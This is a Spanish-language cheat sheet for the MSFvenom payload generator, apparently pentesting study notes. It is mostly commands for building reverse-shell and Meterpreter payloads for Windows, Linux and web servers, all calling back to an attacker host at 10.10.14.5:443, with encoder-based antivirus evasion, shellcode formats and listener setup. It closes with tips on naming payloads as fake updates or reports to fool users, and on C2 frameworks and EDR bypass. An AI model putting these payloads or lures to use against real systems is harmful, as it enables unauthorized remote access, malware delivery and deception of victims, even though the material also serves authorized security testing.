# MSFvenom — Generación de Payloads

**MSFvenom** es la herramienta de línea de comandos de Metasploit para generar payloads standalone. Combina las funciones de los antiguos MSFpayload y MSFencode. Los payloads generados pueden entregarse al objetivo por cualquier canal (email, web, USB, SMB...) sin necesitar el framework completo.

### Sintaxis básica

```bash
msfvenom -p PAYLOAD [OPCIONES] -f FORMATO > archivo.extensión

# Parámetros principales:
# -p  payload a usar
# -f  formato de salida
# -e  encoder a aplicar
# -i  número de iteraciones del encoder
# -b  bytes a evitar en el shellcode (ej: null bytes \x00)
# -o  archivo de salida (alternativa a >)
# -v  nombre de variable (para formatos de shellcode)
# --arch  arquitectura (x86, x64, mipsbe...)
# --platform  plataforma (windows, linux, osx, android...)
# -l  listar (payloads, encoders, formatos)
```

### Listar opciones disponibles

```bash
# Listar todos los payloads
msfvenom -l payloads

# Filtrar por plataforma
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep linux/x64
msfvenom -l payloads | grep meterpreter

# Listar encoders
msfvenom -l encoders

# Listar formatos de salida
msfvenom -l formats

# Ver opciones de un payload específico
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

### Payloads para Windows

```bash
# Shell básica — x86
msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f exe > shell_x86.exe

# Shell básica — x64
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f exe > shell_x64.exe

# Meterpreter staged — x64 (el más usado)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f exe > meterpreter_x64.exe

# Meterpreter HTTPS — más sigiloso
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=10.10.14.5 LPORT=443 \
    -f exe > meterpreter_https.exe

# Meterpreter stageless — más estable
msfvenom -p windows/x64/meterpreter_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f exe > meterpreter_stageless.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f dll > payload.dll

# PowerShell (para ejecutar en memoria)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f psh > payload.ps1

# MSI (ejecutar con msiexec)
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f msi > payload.msi
# En el objetivo: msiexec /q /i payload.msi

# HTA (HTML Application)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f hta-psh > payload.hta
```

### Payloads para Linux

```bash
# Shell básica — ELF
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f elf > shell.elf

# Meterpreter — ELF staged
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f elf > meterpreter.elf

# Meterpreter stageless
msfvenom -p linux/x64/meterpreter_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f elf > meterpreter_stageless.elf

# Shell en bash
msfvenom -p cmd/unix/reverse_bash \
    LHOST=10.10.14.5 LPORT=443 \
    -f raw > shell.sh
```

### Payloads para aplicaciones web

```bash
# PHP — reverse shell
msfvenom -p php/reverse_php \
    LHOST=10.10.14.5 LPORT=443 \
    -f raw > shell.php

# PHP — Meterpreter
msfvenom -p php/meterpreter_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f raw > meterpreter.php

# ASP (IIS clásico)
msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f asp > shell.asp

# ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f aspx > shell.aspx

# JSP (Java / Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f raw > shell.jsp

# WAR (Tomcat — desplegable directamente)
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f war > shell.war
```

### Encoding para evasión básica

```bash
# Aplicar shikata_ga_nai (x86 polimórfico)
msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -e x86/shikata_ga_nai -i 5 \
    -f exe > payload_encoded.exe

# Evitar bytes problemáticos (null bytes, \x0a, \x0d)
msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -b '\x00\x0a\x0d' \
    -f exe > payload_no_nulls.exe

# Combinado: encoding + evitar bytes
msfvenom -p linux/x86/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -b '\x00' \
    -e x86/shikata_ga_nai -i 3 \
    -f elf > payload.elf
```

### Generar shellcode para usar en exploits

A veces se necesita el shellcode raw para insertar en un exploit personalizado:

```bash
# Shellcode en formato C (para incluir en código C/C++)
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f c

# Formato Python
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f python

# Formato hex
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f hex

# Raw (bytes puros)
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.5 LPORT=443 \
    -f raw > shellcode.bin
```

### Recibir conexiones de payloads MSFvenom

```bash
# Con Netcat (para shells básicas)
nc -lvnp 443

# Con Metasploit multi/handler (para Meterpreter)
msf6 > use multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 443
msf6 > set ExitOnSession false
msf6 > exploit -j
```

### Referencia rápida — formatos por OS

| Sistema | Formato   | Extensión | Cómo ejecutar                   |
| ------- | --------- | --------- | ------------------------------- |
| Windows | `exe`     | `.exe`    | Doble clic o cmd                |
| Windows | `dll`     | `.dll`    | `rundll32`, regsvr32, hijacking |
| Windows | `msi`     | `.msi`    | `msiexec /q /i`                 |
| Windows | `psh`     | `.ps1`    | `powershell -f`                 |
| Windows | `hta-psh` | `.hta`    | `mshta` o doble clic            |
| Linux   | `elf`     | `.elf`    | `chmod +x && ./`                |
| PHP     | `raw`     | `.php`    | Upload a servidor web           |
| ASP     | `asp`     | `.asp`    | Upload a IIS                    |
| Java    | `war`     | `.war`    | Deploy en Tomcat                |

> Darle un nombre convincente al payload (ej: `InformeAnual2024.exe`, `AdobeUpdate.msi`) aumenta las probabilidades de que un usuario lo ejecute en ataques de ingeniería social.

> Los payloads sin encoding son detectados por Windows Defender y AV modernos. Para entornos con EDR activo, considerar frameworks de C2 comerciales (Cobalt Strike, Havoc) o técnicas de evasión avanzadas como process injection, AMSI bypass y reflective loading.
